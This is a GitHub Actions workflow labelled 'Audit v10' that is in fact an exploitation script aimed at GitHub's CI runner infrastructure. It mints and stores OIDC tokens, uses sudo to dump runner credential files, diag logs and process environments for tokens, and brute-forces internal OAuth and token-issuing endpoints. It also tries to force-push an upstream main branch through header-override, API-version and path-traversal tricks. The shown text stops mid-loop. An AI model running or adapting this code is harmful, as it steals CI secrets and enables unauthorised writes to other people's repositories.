name: "Audit v10"
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: write
  id-token: write
  pull-requests: write
  issues: write
  checks: write
  statuses: write
  packages: write
  actions: read

jobs:
  v10:
    runs-on: ubuntu-latest
    steps:

    # â”€â”€ STEP 1: Token Extraction + Env Setup â”€â”€
    - name: "Step 1 â€” Tokens"
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        ACTIONS_ID_TOKEN_REQUEST_URL: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_URL || '' }}
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '' }}
      run: |
        set +e
        echo "=== V10 TOKEN EXTRACTION ==="
        RT="$GITHUB_TOKEN"
        echo "RT prefix: ${RT:0:16}"

        # OIDC JWTs
        for AUD in vstoken.actions.githubusercontent.com pipelines.actions.githubusercontent.com results-receiver.actions.githubusercontent.com api.github.com; do
          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
          TOK=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$URL" | jq -r '.value // empty')
          echo "OIDC $AUD = ${#TOK} chars"
          case "$AUD" in
            vstoken*) echo "JWT_VS=$TOK" >> "$GITHUB_ENV" ;;
            pipelines*) echo "JWT_PL=$TOK" >> "$GITHUB_ENV" ;;
            results*) echo "JWT_RR=$TOK" >> "$GITHUB_ENV" ;;
            api*) echo "JWT_API=$TOK" >> "$GITHUB_ENV" ;;
          esac
        done

        echo "RT=$RT" >> "$GITHUB_ENV"
        echo "UPSTREAM=twrps/PoC-RACE2" >> "$GITHUB_ENV"
        echo "FORK=lacaag/PoC-RACE2" >> "$GITHUB_ENV"
        echo "RI=R_kgDOReaECQ" >> "$GITHUB_ENV"
        echo "FRI=R_kgDOReaMug" >> "$GITHUB_ENV"
        echo "API=https://api.github.com" >> "$GITHUB_ENV"
        echo "VT=https://vstoken.actions.githubusercontent.com" >> "$GITHUB_ENV"
        echo "TD=https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21" >> "$GITHUB_ENV"
        echo "PS=https://pipelines.actions.githubusercontent.com" >> "$GITHUB_ENV"
        echo "PD=https://pipelines.actions.githubusercontent.com/serviceDeployments/pipelinesproxcus1" >> "$GITHUB_ENV"
        true

    # â”€â”€ STEP 2: Read Runner _diag logs (CORRECT path: extracted/) â”€â”€
    - name: "Step 2 â€” Runner Diag Logs (extracted/ path)"
      run: |
        set +e
        echo "=== RUNNER _DIAG LOGS â€” EXTRACTED PATH ==="
        echo "v9: files at extracted/ not cached/, Worker+page logs contain token strings"
        echo ""

        DIAG="/home/runner/actions-runner/extracted/_diag"

        echo "--- All diag files ---"
        ls -la "$DIAG"/ 2>/dev/null
        ls -la "$DIAG"/pages/ 2>/dev/null

        echo ""
        echo "--- Worker log FULL (contains SystemVssConnection token) ---"
        cat "$DIAG"/Worker_*.log 2>/dev/null

        echo ""
        echo "--- Runner log FULL ---"
        cat "$DIAG"/Runner_*.log 2>/dev/null

        echo ""
        echo "--- Page logs (step output with token context) ---"
        for F in "$DIAG"/pages/*.log; do
          if [ -f "$F" ]; then
            echo "=== $(basename $F) ==="
            cat "$F" 2>/dev/null
            echo ""
          fi
        done

        echo ""
        echo "--- .credentials from extracted ---"
        cat /home/runner/actions-runner/extracted/.credentials 2>/dev/null || echo "(not found)"

        echo ""
        echo "--- .credentials_rsaparams from extracted ---"
        cat /home/runner/actions-runner/extracted/.credentials_rsaparams 2>/dev/null || echo "(not found)"

        echo ""
        echo "--- .runner from extracted ---"
        cat /home/runner/actions-runner/extracted/.runner 2>/dev/null || echo "(not found)"

        echo ""
        echo "--- .env from extracted ---"
        cat /home/runner/actions-runner/extracted/.env 2>/dev/null || echo "(not found)"

        echo ""
        echo "--- Find ALL token/secret references in actions-runner ---"
        sudo grep -rli "SystemVssConnection\|AccessToken\|GITHUB_TOKEN\|ghs_\|Bearer\|x-access-token" /home/runner/actions-runner/ 2>/dev/null | head -20

        echo ""
        echo "--- Extract token values from Worker log ---"
        grep -oP '(ghs_[A-Za-z0-9]{36}|eyJ[A-Za-z0-9_-]{50,})' "$DIAG"/Worker_*.log 2>/dev/null | sort -u | head -10

        echo ""
        echo "--- /proc Worker environ (full, unfiltered) ---"
        WPID=$(pgrep -f "Runner.Worker" | head -1)
        if [ -n "$WPID" ]; then
          sudo cat /proc/$WPID/environ 2>/dev/null | tr '\0' '\n' | head -80
        fi
        true

    # â”€â”€ STEP 3: vstoken oauth2/token â€” Correct Auth Formats â”€â”€
    - name: "Step 3 â€” vstoken oauth2/token Exploitation"
      run: |
        set +e
        echo "=== VSTOKEN OAUTH2/TOKEN â€” HTTP_400 MEANS ENDPOINT EXISTS ==="
        echo "v9: oauth2/token returned 400 'invalid_client' â€” need correct format"
        echo ""

        EP="$TD/_apis/oauth2/token"
        EP2="$TD/oauth2/token"
        EP3="$VT/_apis/oauth2/token"
        EP4="$VT/oauth2/token"

        echo "--- Try form-urlencoded with various grant types ---"
        for ENDPOINT in "$EP" "$EP2" "$EP3" "$EP4"; do
          for GRANT in \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS" \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS&scope=vso.code_write" \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$RT" \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$RT&scope=vso.code_write" \
            "grant_type=client_credentials&client_id=84ff2294-8721-ab49-db5a-db17b0f6c2de&client_secret=$RT" \
            "grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$JWT_VS" \
            "grant_type=refresh_token&refresh_token=$RT" \
            "grant_type=password&username=github-actions&password=$RT" \
            "grant_type=authorization_code&code=$RT&redirect_uri=https://github.com" \
            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$RT&subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT_VS&subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$RT&subject_token_type=urn:ietf:params:oauth:token-type:access_token&resource=https://github.com/twrps/PoC-RACE2"; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "$GRANT" "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            GT=$(echo "$GRANT" | grep -oP 'grant_type=[^&]+' | head -1)
            if [ "$CODE" != "404" ]; then
              echo "O01 $ENDPOINT $GT = HTTP_$CODE body='$BODY'"
            fi
          done
        done

        echo ""
        echo "--- Try JSON body ---"
        for ENDPOINT in "$EP" "$EP2" "$EP3" "$EP4"; do
          for PAYLOAD in \
            '{"grant_type":"urn:ietf:params:oauth:grant-type:jwt-bearer","assertion":"'"$JWT_VS"'"}' \
            '{"grant_type":"client_credentials","client_id":"84ff2294-8721-ab49-db5a-db17b0f6c2de","client_secret":"'"$RT"'"}' \
            '{"grant_type":"urn:ietf:params:oauth:grant-type:token-exchange","subject_token":"'"$RT"'","subject_token_type":"urn:ietf:params:oauth:token-type:access_token"}' \
            '{"client_assertion":"'"$JWT_VS"'","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","grant_type":"client_credentials"}'; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
              -H "Content-Type: application/json" \
              -H "Authorization: Bearer $RT" \
              -d "$PAYLOAD" "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            GT=$(echo "$PAYLOAD" | jq -r '.grant_type // empty' 2>/dev/null)
            if [ "$CODE" != "404" ]; then
              echo "O02 $ENDPOINT json $GT = HTTP_$CODE body='$BODY'"
            fi
          done
        done

        echo ""
        echo "--- Try tokenoauth2 endpoint ---"
        for ENDPOINT in "$TD/_apis/tokenoauth2/token" "$VT/_apis/tokenoauth2/token"; do
          for GRANT in \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS" \
            "grant_type=client_credentials&client_assertion=$JWT_VS&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "$GRANT" "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            GT=$(echo "$GRANT" | grep -oP 'grant_type=[^&]+' | head -1)
            if [ "$CODE" != "404" ]; then
              echo "O03 $ENDPOINT $GT = HTTP_$CODE body='$BODY'"
            fi
          done
        done

        echo ""
        echo "--- Try WebPlatformAuth SessionToken ---"
        for ENDPOINT in "$TD/_apis/WebPlatformAuth/SessionToken" "$VT/_apis/WebPlatformAuth/SessionToken"; do
          CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"provider":"github","tokenType":"compact"}' "$ENDPOINT" 2>/dev/null)
          BODY=$(cat /tmp/oauth_resp | head -c 400)
          if [ "$CODE" != "404" ]; then
            echo "O04 SessionToken $ENDPOINT = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- Try TokenIssue AccessTokens (mint new tokens) ---"
        for ENDPOINT in "$TD/_apis/TokenIssue/AccessTokens" "$TD/_apis/tokenissue/accesstokens" "$VT/_apis/TokenIssue/AccessTokens"; do
          for PAYLOAD in \
            '{"scope":"vso.code_write","validityHours":1}' \
            '{"tokenType":"compact","scope":"app_token"}' \
            '{}'; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD" "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            if [ "$CODE" != "404" ]; then
              echo "O05 TokenIssue $ENDPOINT = HTTP_$CODE body='$BODY'"
            fi
          done
        done

        echo ""
        echo "--- Try TokenIssue SessionTokens ---"
        for ENDPOINT in "$TD/_apis/TokenIssue/SessionTokens" "$VT/_apis/TokenIssue/SessionTokens"; do
          CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -d '{"scope":"vso.code_write"}' "$ENDPOINT" 2>/dev/null)
          BODY=$(cat /tmp/oauth_resp | head -c 400)
          if [ "$CODE" != "404" ]; then
            echo "O06 SessionTokens $ENDPOINT = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- Try TokenAuth endpoints ---"
        for ENDPOINT in \
          "$TD/_apis/TokenAuth/Authorizations" \
          "$TD/_apis/TokenAuth/HostAuthorization" \
          "$TD/_apis/TokenAuth/Registration" \
          "$TD/_apis/TokenAuth/RegistrationSecret" \
          "$VT/_apis/TokenAuth/Authorizations" \
          "$VT/_apis/TokenAuth/HostAuthorization"; do
          for METHOD in GET POST; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X $METHOD \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              -d '{}' "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            if [ "$CODE" != "404" ]; then
              echo "O07 $METHOD $ENDPOINT = HTTP_$CODE body='$BODY'"
            fi
          done
        done

        echo ""
        echo "--- Try TokenAdministration PAT management ---"
        for ENDPOINT in \
          "$TD/_apis/TokenAdministration/TokenPersonalAccessTokens" \
          "$TD/_apis/TokenAdministration/TokenRevocations" \
          "$TD/_apis/TokenAdministration/TokenListGlobalIdentities" \
          "$VT/_apis/TokenAdministration/TokenPersonalAccessTokens"; do
          for METHOD in GET POST; do
            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X $METHOD \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              -d '{}' "$ENDPOINT" 2>/dev/null)
            BODY=$(cat /tmp/oauth_resp | head -c 400)
            if [ "$CODE" != "404" ]; then
              echo "O08 $METHOD $ENDPOINT = HTTP_$CODE body='$BODY'"
            fi
          done
        done
        true

    # â”€â”€ STEP 4: X-HTTP-Method-Override Exploitation â”€â”€
    - name: "Step 4 â€” Method Override + Version Confusion"
      run: |
        set +e
        echo "=== X-HTTP-METHOD-OVERRIDE EXPLOITATION ==="
        echo "v9: POST with X-HTTP-Method-Override:PATCH â†’ 422 (NOT 403!)"
        echo "v9: PUT with non-2022-11-28 version â†’ 400 (NOT 403!)"
        echo "Strategy: Supply correct body to make the overridden method succeed"
        echo ""

        MAIN_SHA=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs/heads/main" | jq -r '.object.sha')
        echo "Upstream main: $MAIN_SHA"

        # Create a fork commit to use
        BLOB=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/blobs" -d '{"content":"v10 method override","encoding":"utf-8"}' | jq -r '.sha')
        UP_TREE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/commits/$MAIN_SHA" | jq -r '.tree.sha')
        TREE=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/trees" \
          -d '{"base_tree":"'"$UP_TREE"'","tree":[{"path":"OVERRIDE.md","mode":"100644","type":"blob","sha":"'"$BLOB"'"}]}' | jq -r '.sha')
        COMMIT=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/commits" \
          -d '{"message":"v10 override","tree":"'"$TREE"'","parents":["'"$MAIN_SHA"'"]}' | jq -r '.sha')
        echo "Fork commit: $COMMIT"

        echo ""
        echo "--- POST + Method-Override:PATCH on upstream refs/heads/main ---"
        for OVERRIDE_HDR in \
          "X-HTTP-Method-Override: PATCH" \
          "X-HTTP-Method-Override: PUT" \
          "X-Http-Method-Override: PATCH" \
          "X-HTTP-Method: PATCH" \
          "X-Method-Override: PATCH"; do
          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -H "$OVERRIDE_HDR" \
            -d '{"sha":"'"$COMMIT"'","force":true}' \
            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
          BODY=$(cat /tmp/mo_resp | head -c 300)
          echo "M01 $OVERRIDE_HDR = HTTP_$CODE body='$BODY'"
        done

        echo ""
        echo "--- POST + Method-Override:PUT on upstream contents ---"
        B64CONTENT=$(echo "v10 override escape" | base64)
        for OVERRIDE_HDR in \
          "X-HTTP-Method-Override: PUT" \
          "X-Http-Method-Override: PUT" \
          "X-HTTP-Method: PUT" \
          "X-Method-Override: PUT"; do
          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -H "$OVERRIDE_HDR" \
            -d '{"message":"v10 override","content":"'"$B64CONTENT"'"}' \
            "$API/repos/$UPSTREAM/contents/OVERRIDE.md" 2>/dev/null)
          BODY=$(cat /tmp/mo_resp | head -c 300)
          echo "M02 $OVERRIDE_HDR PUT contents = HTTP_$CODE body='$BODY'"
        done

        echo ""
        echo "--- API version confusion + write operations ---"
        echo "v9: non-2022-11-28 versions give 400 on writes = parse before auth check"
        for VER in "2023-11-28" "2024-01-01" "2022-01-01" "2021-01-01" "2020-01-01" "1969-12-31" "9999-12-31"; do
          # PATCH ref with version confusion
          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: $VER" \
            -d '{"sha":"'"$COMMIT"'","force":true}' \
            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
          BODY=$(cat /tmp/mo_resp | head -c 200)
          echo "M03 PATCH main ver=$VER = HTTP_$CODE body='${BODY:0:150}'"

          # POST ref with version confusion
          CODE2=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: $VER" \
            -d '{"ref":"refs/heads/v10-escape","sha":"'"$COMMIT"'"}' \
            "$API/repos/$UPSTREAM/git/refs" 2>/dev/null)
          BODY2=$(cat /tmp/mo_resp | head -c 200)
          echo "M03 POST refs ver=$VER = HTTP_$CODE2 body='${BODY2:0:150}'"
        done

        echo ""
        echo "--- Double content-type confusion ---"
        for CT in \
          "application/json" \
          "application/x-www-form-urlencoded" \
          "multipart/form-data" \
          "text/plain" \
          "application/xml" \
          "application/octet-stream"; do
          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -H "Content-Type: $CT" \
            -d '{"sha":"'"$COMMIT"'","force":true}' \
            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
          BODY=$(cat /tmp/mo_resp | head -c 200)
          echo "M04 CT=$CT PATCH main = HTTP_$CODE body='${BODY:0:150}'"
        done

        echo ""
        echo "--- Chunked transfer encoding ---"
        CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
          -H "Authorization: token $RT" \
          -H "Accept: application/vnd.github+json" \
          -H "Transfer-Encoding: chunked" \
          -d '{"sha":"'"$COMMIT"'","force":true}' \
          "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
        BODY=$(cat /tmp/mo_resp | head -c 200)
        echo "M05 chunked PATCH main = HTTP_$CODE body='${BODY:0:150}'"

        echo ""
        echo "--- Path traversal + encoding tricks ---"
        for TPATH in \
          "/repos/$UPSTREAM/git/refs/heads/main" \
          "/repos/$UPSTREAM/git/refs/heads/./main" \
          "/repos/$UPSTREAM/git/refs/heads/main%00" \
          "/repos/$UPSTREAM/git/refs/heads/../heads/main" \
          "/repos/$UPSTREAM/git/refs%2Fheads%2Fmain" \
          "/repos/twrps/PoC-RACE2/../PoC-RACE2/git/refs/heads/main" \
          "/repos/TWRPS/POC-RACE2/git/refs/heads/main"; do
          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            -d '{"sha":"'"$COMMIT"'","force":true}' \
            "${API}${TPATH}" 2>/dev/null)
          BODY=$(cat /tmp/mo_resp | head -c 200)
          if [ "$CODE" != "404" ] && [ "$CODE" != "403" ]; then
            echo "M06 path=$TPATH = HTTP_$CODE body='${BODY:0:150}'"
          fi
        done
        true

    # â”€â”€ STEP 5: Pipelines Distributed Task Exploitation â”€â”€
    - name: "Step 5 â€” Pipelines distributedtask + broker"
      run: |
        set +e
        echo "=== PIPELINES DISTRIBUTED TASK EXPLOITATION ==="
        echo "v9: pipelines has brokerlistener, createdsession, packages, actions/orgs"
        echo ""

        echo "--- distributedtask endpoints ---"
        for EP in \
          "$PD/_apis/distributedtask/pools" \
          "$PD/_apis/distributedtask/tasks" \
          "$PD/_apis/distributedtask/serviceinterfaces" \
          "$PD/_apis/distributedtask/packages" \
          "$PD/_apis/distributedtask/packagedownload" \
          "$PD/_apis/distributedtask/brokerlistener" \
          "$PD/_apis/distributedtask/createdsession" \
          "$PD/_apis/distributedtask/agentclouds" \
          "$PD/_apis/distributedtask/agents" \
          "$PD/_apis/distributedtask/queues" \
          "$PD/_apis/distributedtask/jobrequests" \
          "$PD/_apis/distributedtask/taskgroups" \
          "$PD/_apis/distributedtask/variablegroups" \
          "$PD/_apis/distributedtask/endpoints" \
          "$PS/_apis/distributedtask/pools" \
          "$PS/_apis/distributedtask/packages" \
          "$PS/_apis/distributedtask/brokerlistener" \
          "$PS/_apis/distributedtask/createdsession"; do
          for METHOD in GET POST; do
            CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" -X $METHOD \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              -d '{}' "$EP" 2>/dev/null)
            BODY=$(cat /tmp/dt_resp | head -c 300)
            if [ "$CODE" != "404" ]; then
              echo "D01 $METHOD $EP = HTTP_$CODE body='${BODY:0:250}'"
            fi
          done
        done

        echo ""
        echo "--- pipelines + build + runtime + actions ---"
        for EP in \
          "$PD/_apis/pipelines" \
          "$PD/_apis/pipelines/runs" \
          "$PD/_apis/pipelines/workflows" \
          "$PD/_apis/build/builds" \
          "$PD/_apis/build/definitions" \
          "$PD/_apis/runtime/pipelines" \
          "$PD/_apis/runtime/workflows" \
          "$PD/_apis/actions/orgs" \
          "$PD/_apis/actions/workflows" \
          "$PD/_apis/actions/runs" \
          "$PD/_apis/actions/artifacts" \
          "$PD/_apis/PipelinesChecks" \
          "$PD/_apis/PipelinesChecks/runs" \
          "$PD/_apis/PipelinesChecks/configurations" \
          "$PD/_apis/serviceendpoint/endpoints" \
          "$PD/_apis/Container/Containers" \
          "$PS/_apis/pipelines" \
          "$PS/_apis/pipelines/runs" \
          "$PS/_apis/build/builds" \
          "$PS/_apis/actions/orgs" \
          "$PS/_apis/Container/Containers"; do
          CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" \
            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
          BODY=$(cat /tmp/dt_resp | head -c 300)
          if [ "$CODE" != "404" ]; then
            echo "D02 $EP = HTTP_$CODE body='${BODY:0:250}'"
          fi
        done

        echo ""
        echo "--- Try with OIDC JWT for pipelines ---"
        for EP in \
          "$PD/_apis/distributedtask/pools" \
          "$PD/_apis/distributedtask/packages" \
